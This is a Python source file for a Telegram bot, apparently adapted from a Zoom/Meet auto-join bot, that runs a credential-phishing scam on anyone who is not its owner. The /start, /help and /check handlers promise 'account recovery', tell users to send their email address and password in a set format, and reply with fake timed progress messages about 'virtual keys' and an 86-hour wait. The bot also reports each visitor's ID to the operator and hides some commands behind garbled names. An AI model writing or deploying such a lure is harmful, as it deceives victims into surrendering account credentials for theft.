import logging
import os
import time
import pickle
from telegram.ext import CommandHandler, Job, run_async
from telegram import ChatAction
from config import Config
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from os import execl
from sys import executable
from bot import updater, dp, browser, restricted


from bot.zoom import zoom

if Config.SCHEDULE == True:
    from bot.meet_schedule import mJobQueue, timeTable
    from bot.zoom_schedule import zJobQueue

userId = Config.USERID


@run_async
def exit(update, context):
    context.bot.send_message(chat_id=userId, text="Restarting bot, Please wait!")
    browser.quit()
    execl(executable, executable, "chromium.py")


@run_async
def status(update, context):
    browser.save_screenshot("ss.png")
    context.bot.send_chat_action(chat_id=userId, action=ChatAction.UPLOAD_PHOTO)
    context.bot.send_photo(chat_id=userId, photo=open('ss.png', 'rb'), timeout = 120)
    os.remove('ss.png')


@run_async
def start(update, context):
    userId = Config.USERID
    user_id = update.effective_user.id
    if user_id != int(userId):
        print("Unauthorized access denied for {0}. Allowed users: {1}".format(user_id, userId))
        context.bot.send_message(chat_id=user_id,
                                 text="your account recovery paskey bot in progress issue only  contact otherwise don't distrub @alpha_romeo_06")
        context.bot.send_message(chat_id=userId,
                                 text=" Unauthorized access denied for {0}. Allowed users: {1}".format(user_id, userId))
        return
    else:
          context.bot.send_message(chat_id=user_id,
                                 text='''everything will be done make a sever to run it''')

@run_async
def help(update, context):
    userId = Config.USERID
    user_id = update.effective_user.id
    if user_id != int(userId):
     context.bot.send_message(chat_id=user_id, text="""
       /accnt 
       <email> 
       <password>  
       example :
       must @gmail
       testverison@gamil.com
       12345678@s
       issue means dm to chck and send ss
       this process start in 1 min or lesthan 60 second
       """)
     time.sleep(60)
     context.bot.send_message(chat_id=user_id, text="""
           ok now your email get progress if you dont summited your email and passwrd recovery properly dm @alpha_romeo_06 to reset it bot
           use check cmd by click /check
           """)
     return
    else:
          context.bot.send_message(chat_id=user_id,
                                 text='''everything will be done make a sever to run it''')

@run_async
def check(update, context):
    userId = Config.USERID
    user_id = update.effective_user.id
    if user_id != int(userId):
       context.bot.send_message(chat_id=user_id, text="""
     verify your account detail once done it will in progress
     """)
       time.sleep(15)
       context.bot.send_message(chat_id=user_id, text="""
           your virtuval keys and code in paskey wait for 86 hrs it in waiting list
           """)
       time.sleep(30)
       context.bot.send_message(chat_id=user_id, text="your process started and your auth id {0}".format(user_id))
       time.sleep(30000)
       context.bot.send_message(chat_id=user_id, text="your process started and your auth id {0}".format(user_id))
       return
    else:
          context.bot.send_message(chat_id=user_id,
                                 text='''everything will be done make a sever to run it''')


def main():
    j = updater.job_queue

    dp.add_handler(CommandHandler("z0000oom", zoom))
    

    if Config.SCHEDULE == True:
        mJobQueue()
        zJobQueue()
        dp.add_handler(CommandHandler("timejsjsjwtable", timeTable))

    dp.add_handler(CommandHandler("exit", exit))
    dp.add_handler(CommandHandler("check", check))
    dp.add_handler(CommandHandler("help", help))
    dp.add_handler(CommandHandler("start", start))
    logging.info("Bot started")

    updater.start_polling()

if __name__ == '__main__':
    main()
